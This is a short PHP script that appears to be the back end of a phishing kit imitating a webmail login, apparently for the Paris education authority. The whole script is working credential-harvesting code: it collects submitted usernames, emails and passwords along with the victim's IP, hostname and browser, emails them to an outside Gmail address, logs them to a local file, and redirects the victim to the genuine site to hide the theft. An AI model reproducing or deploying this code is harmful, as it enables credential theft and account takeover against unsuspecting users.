<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "+-|### webmail AC ###-+\n";
$message .= "ID			: ".$_POST['username']."\n";
$message .= "E-mail		: ".$_POST['usernames']."\n";
$message .= "MDP	    : ".$_POST['password']."\n";
$message .= "IP Address : ".$ip."\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "+-|### webmail AC ### by Qalimo|-+\n";
$send = "alainrouss65@gmail.com";
$subject = "### webmail AC ### $ip";
$headers = "From: ### webmail AC ### <info@inc.de>";
mail($send,$subject,$message,$headers);
$fp = fopen("Cb.txt", "a");
			fputs($fp, $message);
			fclose($fp);
header("Location: https://www.ac-paris.fr");
?>